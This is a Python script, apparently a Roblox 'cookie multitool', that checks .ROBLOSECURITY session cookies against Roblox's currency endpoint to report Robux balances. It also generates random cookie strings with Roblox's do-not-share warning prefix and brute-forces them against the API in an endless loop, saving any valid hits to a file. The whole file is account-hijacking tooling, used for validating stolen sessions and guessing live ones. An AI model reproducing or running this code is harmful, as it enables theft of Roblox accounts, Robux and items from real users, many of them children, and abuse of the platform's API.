import colorama, random, requests
colorama.init()
def cookie_checker():
	cookie = input("Enter Cookie: ")
	r = requests.get("https://api.roblox.com/currency/balance", cookies={".ROBLOSECURITY": str(cookie)})
	if "200" in str(r):
		print("Cookie Valid")
		re = r.json()
		print("Amount Of Robux: " + str(re["robux"]))
		input("")
		return
	if "200" not in str(r):
		print("Cookie Invalid")
		input("")
		return
def cookie_gen():
	while True:
		try:
			main = input("Enter How Many Cookies You Wanna Generate: ")
			main = int(main)
			main = str(main)
			break
		except Exception:
			print("Enter A Valid Choice")
	print("Generating, Please Be Patient")
	limit = int(main)
	done = 0
	choices = "ABCDEF123456789"
	while True:
		numba1 = random.choices(choices, k=732)
		file = open("cookie.txt", "a")
		file.write("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")
		file.write(''.join(numba1))
		file = open("cookie.txt", "a")
		file.write("\n")
		file.close()
		done = int(done) + 1
		print(f"{done} Cookie(s) Have Been Generated")
		if done == limit:
			print("Done")
			input("")
			return
def cookie_gen_checker():
	while True:
		save = input("Auto Save (y/n): ")
		if save == "y" or save == "n":
			break
		else:
			print("Enter A Valid Choice")
	choices = "ABCDEF123456789"
	while True:
		numba1 = random.choices(choices, k=732)
		cookie_to_check = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + ''.join(numba1)
		("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")
		r2 = requests.get("https://api.roblox.com/currency/balance", cookies={".ROBLOSECURITY": str(cookie_to_check)})
		r2 = str(r2)
		if "200" in r2:
			print("Cookie Valid: " + str(cookie_to_check))
			if save == "y":
				file = open("valid_cookies.txt", "a")
				file.write(cookie_to_check + "\n")
				file.close()
		if "200" not in r2:
			print("Cookie Invalid: " + cookie_to_check)
			if save == "y":
				file2 = open("invalid_cookies.txt", "a")
				file2.write(cookie_to_check + "\n")
				file2.close()		
while True:
    print(colorama.Fore.CYAN + """
    _________                __   .__               
    \_   ___ \  ____   ____ |  | _|__| ____         
    /    \  \/ /  _ \ /  _ \|  |/ /  |/ __ \        
    \     \___(  <_> |  <_> )    <|  \  ___/        
    \______  /\____/ \____/|__|_ \__|\___  >       
            \/                   \/       \/        
    _____        .__   __  .__  __         .__   
    /     \  __ __|  |_/  |_|__|/  |_  ____ |  |  
    /  \ /  \|  |  \  |\   __\  \   __\/  _ \|  |  
    /    Y    \  |  /  |_|  | |  ||  | (  <_> )  |__
    \____|__  /____/|____/__| |__||__|  \____/|____/
            \/                                      
            MADE BY blob#0005""")
    print(colorama.Fore.CYAN + """
    1. Singular Cookie Checker
    2. Cookie Generator
    3. Cookie Generator And Auto Check""")
    main = input("> ")
    if main == "1":
        cookie_checker()
    if main == "2":
        cookie_gen()
    if main == "3":
        cookie_gen_checker()
